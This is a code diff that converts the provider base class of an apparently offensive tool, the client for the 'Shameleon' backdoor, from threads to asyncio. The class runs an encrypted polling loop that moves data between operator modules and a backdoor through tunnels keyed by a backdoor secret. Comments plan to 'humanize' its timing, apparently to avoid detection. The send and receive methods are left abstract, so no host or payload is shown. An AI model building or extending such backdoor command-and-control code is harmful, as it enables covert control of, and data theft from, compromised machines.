@@ -1,8 +1,7 @@
 from __future__ import annotations
 
+import asyncio
 import sys
-import threading
-import time
 from pkgutil import iter_modules
 from queue import Queue
 from uuid import uuid4
@@ -12,21 +11,20 @@ from cryptography.fernet import Fernet
 from shameleon_client.profile import Profile
 
 
-class ShameleonProvider(threading.Thread):
+class ShameleonProvider():
     """ Class representing a Shameleon provider.
 
     Shameleon providers are used to communicate with the Shameleon backdoor.
     They are used by modules to send and receive data from the backdoor.
     The ShameleonProvider class is a base class that must be inherited by
     specific providers.
-    The ShameleonProvider class is a thread that will run in background.
     """
     _PROVIDERS: dict[str, type[ShameleonProvider]] = {}
 
     def __init__(self, profile: Profile):
         super().__init__()
         self._profile = profile
-        self._crypto = Fernet(self._profile.backdoor_secret)
+        self._crypto = Fernet(self._profile.backdoor_secret.encode('utf-8'))
         self._tunnels: dict[str, dict[str, Queue]] = {
             'system': {'in': Queue(), 'out': Queue()},
         }
@@ -34,7 +32,7 @@ class ShameleonProvider(threading.Thread):
             'system': '',
         }
 
-    def run(self):
+    async def run(self):
         while True:
             # Send chuncks
             buffer: list[str] = []
@@ -42,19 +40,19 @@ class ShameleonProvider(threading.Thread):
                 while not streams['out'].empty():
                     buffer.append(streams['out'].get(block=False))
             if len(buffer) > 0:
-                self._send_payload(buffer)
-                time.sleep(1)  # TODO: Humanize and use backdoor config
+                await self._send_payload(buffer)
+                await asyncio.sleep(1)  # TODO: Humanize and use backdoor config
             # Receive chuncks
-            incoming = self._get_payload()
+            incoming = await self._get_payload()
             if len(incoming) > 0:
                 for tunnel_id, data in incoming:
                     self._tunnels[tunnel_id]['in'].put(data)
             else:
                 pass
                 # TODO: Increase waiting time using config parameters
-            time.sleep(1)  # TODO: Humanize and use backdoor config
+            await asyncio.sleep(1)  # TODO: Humanize and use backdoor config
 
-    def request_tunnel(self, tunnel_type: str) -> str:
+    async def request_tunnel(self, tunnel_type: str) -> str:
         """ Request a tunnel to the backdoor.
 
         This method is used to request a tunnel to the backdoor. The tunnel
@@ -71,13 +69,14 @@ class ShameleonProvider(threading.Thread):
         Returns:
             str: Unique identifier of the tunnel
         """
-        print(f"[i] Requesting tunnel for '{tunnel_type}'")
+        print(f"[*] Requesting tunnel for '{tunnel_type}'")
         tunnel_uuid = str(uuid4()).split('-')[0]
         content = f"{tunnel_type}:{tunnel_uuid}"
         self.send_data("system", content.encode('utf-8'))
-        while True:
+        while True:  # TODO: add a timeout ?
             incomming = self.receive_data("system")
             if len(incomming) == 0:
+                await asyncio.sleep(0.1)
                 continue
             decoded_data = incomming.decode('utf-8')
             if decoded_data != 'OK':
@@ -154,10 +153,10 @@ class ShameleonProvider(threading.Thread):
         return results
 
     # Must be implemented
-    def _send_payload(self, data: list[str]):
+    async def _send_payload(self, data: list[str]):
         raise NotImplementedError()
 
-    def _get_payload(self) -> list[tuple[str, str]]:
+    async def _get_payload(self) -> list[tuple[str, str]]:
         raise NotImplementedError()
 
     # Following methods are helpers that can be used
